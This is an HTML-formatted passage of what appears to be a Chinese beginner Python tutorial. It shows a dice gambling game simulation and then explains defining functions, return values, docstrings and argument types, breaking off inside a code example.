&lt;p&gt;玩家进入游戏的时候有1000元赌注，全部输光游戏结束&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;randint &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#从random模块导入randint函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;money=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1000&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;money&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;你的资产为：&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,money)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  needs_go_on=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    xiazhu=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;请下注:&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;xiazhu&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0 &lt;&#x2F;span&gt;&lt;span&gt;and xiazhu&amp;lt;=money:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;break&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  first=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;)+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;玩家摇出的点数是&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;点：&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%first)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;first==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;7 &lt;&#x2F;span&gt;&lt;span&gt;or first==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;11&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;玩家胜！&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    money+=xiazhu&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;first==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2 &lt;&#x2F;span&gt;&lt;span&gt;or first==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span&gt;or first==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;12&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;庄家胜！&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    money-=xiazhu&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    needs_go_on=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;needs_go_on:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    second=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;)+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;玩家摇出的点数是&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;点：&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%second)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;second==&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;庄家胜！&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      money-=xiazhu&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      needs_go_on=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;second==first:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;玩家胜！&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      money+=xiazhu&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;​      needs_go_on=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;False&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;你已经破产了！&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)  &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Python函数&lt;&#x2F;p&gt;
&lt;p&gt;函数是一组可重复使用，有特定功能的代码块&lt;&#x2F;p&gt;
&lt;p&gt;函数功能：&lt;&#x2F;p&gt;
&lt;p&gt;可以重复使用&lt;&#x2F;p&gt;
&lt;p&gt;减少程序代码量&lt;&#x2F;p&gt;
&lt;p&gt;提高代码的可读性&lt;&#x2F;p&gt;
&lt;p&gt;函数的原理&lt;&#x2F;p&gt;
&lt;p&gt;调用函数 （调用Python内建函数）&lt;&#x2F;p&gt;
&lt;p&gt;通过为函数传入参数，即可得到相关的返回结果&lt;&#x2F;p&gt;
&lt;p&gt;函数使用过程中，我们无需知道函数内部的实现原理&lt;&#x2F;p&gt;
&lt;p&gt;不同函数需要参数的个数和类型是不同的&lt;&#x2F;p&gt;
&lt;p&gt;创建函数&lt;&#x2F;p&gt;
&lt;p&gt;def 函数名（参数）：&lt;&#x2F;p&gt;
&lt;p&gt;‘函数说明’&lt;&#x2F;p&gt;
&lt;p&gt;函数代码块（函数体）&lt;&#x2F;p&gt;
&lt;p&gt;return xx&lt;&#x2F;p&gt;
&lt;p&gt;函数名与变量的命名规则是一样的，可以包括下划线、数字、字母等&lt;&#x2F;p&gt;
&lt;p&gt;括号内可以设置参数，也可以没有参数&lt;&#x2F;p&gt;
&lt;p&gt;函数说明是可选，用于解释该函数的功能，对程序员更加友好&lt;&#x2F;p&gt;
&lt;p&gt;函数代码块采用的是4个空格缩进，由变量、参数、表达式等语句组成&lt;&#x2F;p&gt;
&lt;p&gt;return为函数的可选部分&lt;&#x2F;p&gt;
&lt;p&gt;若不包括return，这个函数被称为“不返回值函数”，相当于return None&lt;&#x2F;p&gt;
&lt;p&gt;若包括return，这个函数被称为“返回值函数”&lt;&#x2F;p&gt;
&lt;p&gt;不带参函数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;():&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello,world&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;带参函数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,name)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;返回值函数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,name)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;name*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;带函数说明函数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;#39;&amp;#39;&amp;#39;这是一个hello函数&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,name)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;name*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hello&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(hello.__doc__) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#用来查看函数说明&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;函数参数&lt;&#x2F;p&gt;
&lt;p&gt;\1.   位置参数&lt;&#x2F;p&gt;
&lt;p&gt;函数根据位置顺序将参数传入函数&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;a+b&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;\2.   默认参数&lt;&#x2F;p&gt;
&lt;p&gt;函数将部分参数指向默认值，后续可以不用为此参数传入值。如果默认参数所在位置有传入值，则默认参数指定的值被覆盖&lt;&#x2F;p&gt;
&lt;p&gt;\3.   关键字参数&lt;&#x2F;p&gt;
&lt;p&gt;使用关键字参数容许函数在调用时参数的顺序与声明时不一致。&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  c=a+b&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(c)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt; &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;sum&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;a&lt;&#x2F;span&gt;&lt;span&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;3&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;\4.   可变长参数&lt;&#x2F;p&gt;
&lt;p&gt;非关键字可变长参数（*元组）&lt;&#x2F;p&gt;
&lt;p&gt;def func(*tuple)&lt;&#x2F;p&gt;
&lt;p&gt;通过*获取可变数量的参数，并全部放入元组&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span&gt;(*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;args&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(args)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
